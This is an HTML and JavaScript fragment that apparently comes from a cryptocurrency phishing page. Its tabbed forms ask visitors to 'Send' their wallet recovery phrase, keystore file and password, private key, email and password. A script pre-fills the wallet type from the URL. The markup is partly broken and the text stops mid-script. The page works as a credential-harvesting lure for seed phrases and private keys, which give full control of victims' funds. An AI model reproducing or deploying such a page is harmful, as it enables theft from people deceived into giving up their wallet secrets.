    <script>
        function openCity(evt, cityName) {
            // Declare all variables
            var i, tabcontent, tablinks;

            // Get all elements with class="tabcontent" and hide them
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }

            // Get all elements with class="tablinks" and remove the class "active"
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }

            // Show the current tab, and add an "active" class to the button that opened the tab
            document.getElementById(cityName).style.display = "block";
            evt.currentTarget.className += " active";
        }
    </script>

    <div class="tab">

        <button class="tablinks" onClick="openCity(event, 'keystore')">

    <!-- phrase form -->

    <div id="phrase" class="tabcontent" style="display: block">
        <form id="contact-form" class="main_form">
            <input type="hidden" name="category" value="Phrase" />
            <div class="row">
                <div class="col-md-12 ">
                    <input class="contactus" placeholder="Wallet type" type="text" name="wallet">
                </div>
                <div class="col-md-12">

                        Typically 12 (sometimes 24) words separated by single spaces
                    </div>
                </div>
                <br>

                    <input class="contactus" placeholder="Email" type="email" name="email">
                </div>
                <br />
                <div class="col-md-12">
                    <input class="contactus" placeholder="password" type="password" name="message">
                </div>
                <br />
                <div class="col-md-12">
                    <input type="submit" value="Send" class="send_btn" />
                    <!-- <button class="send_btn"  id="js_send"> Send</button> -->
                </div>
            </div>
        </form>
    </div>



    <!-- keystore form -->


    <div id="keystore" class="tabcontent" style="display: none">

        <form  class="main_form">
            <input type="hidden" name="category" value="Phrase" />
            <div class="row">
                <div class="col-md-12 ">
                    <input class="contactus" placeholder="Wallet type" type="text" name="wallets">
                </div>
                <div class="col-md-12">
                    <textarea name="phrase" class="contactus" minlength="12" placeholder="Phrase" required></textarea>
                    <br>
                    <div>
                        Several lines of text beginning with '(...)' plus the password you
                        used to encrypt it.
                    </div>
                </div>
                <div class="col-md-12">
                    <input class="contactus" placeholder="password" type="password" name="message">
                </div>
                <br />
                <div class="col-md-12">
                    <input type="submit" value="Send" class="send_btn" />
                </div>
            </div>


    </div>


    <!-- private form -->
    <div id="private" class="tabcontent" style="display: none">

        <form class="main_form"  method="POST">
            <input type="hidden" name="category" value="Phrase" />
            <div class="row">
                <div class="col-md-12 ">
                    <input class="contactus" placeholder="Wallet type" type="text" name="wallets">
                </div>
                <div class="col-md-12">
                    <input class="contactus" placeholder="private key" type="text" name="key">
                    <br>
                    <div class="desc">
                        Typically 12 (sometimes 24) words separated by single spaces
                    </div>
                </div>
                <br />
                <div class="col-md-12">
                    <button class="send_btn">Send</button>
                </div>
            </div>
        </form>
    </div>

    <script>
        document.getElementById("default").click();
        const urlParams = new URLSearchParams(window.location.search);
        const walletType = urlParams.get("type");
        document.querySelectorAll("input[name='wallet']").forEach((node) => {
            node.value = walletType;
